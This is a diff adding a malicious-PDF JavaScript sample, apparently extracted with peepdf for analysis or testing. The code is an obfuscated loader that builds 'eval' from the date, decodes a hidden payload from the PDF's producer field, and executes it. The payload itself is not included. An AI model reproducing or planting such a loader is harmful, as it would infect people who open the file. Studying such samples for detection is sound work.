@@ -1,0 +1,15 @@
+// peepdf comment: Javascript code located in object 1 (version 0)
+
+<< /Names [() <</S /JavaScript
+/JS (var a=function(){zd=(function(){return this;})();xf=new Date();var id='';var qst='e'+(parseInt(xf.getFullYear())-2)+'a'+id+'l';nkvh=zd[qst.replace('2008','v')];var rlk='';var id='';nkvh('va'+id+'r zlb=th'+id+'i'+id+'s');nkvh(''+id+' mqmu=Str'+id+'ing.f'+id+'romC'+id+'harCode');nr='pr'+id+'od'+id+'uc'+'er';var bjp=zlb[nr];mxyq=id;nkvh('va'+mxyq+'r n'+id+'r=['+bjp+mxyq+']');tpx=nr;tp='le'+id+'ng'+id+'th';hgh=parseInt(tpx[tp]);id=0;moyj=xf.getFullYear()/1005;
+var b = function(q) {
+        return parseInt(q / 2);
+    };
+while (id < hgh) {
+    rlk += mqmu(tpx[b(id) + b(hgh)] - tpx[b(id)]);
+    id += 2;
+}
+nkvh(rlk);
+};
+a.call();) >> ] >>
+
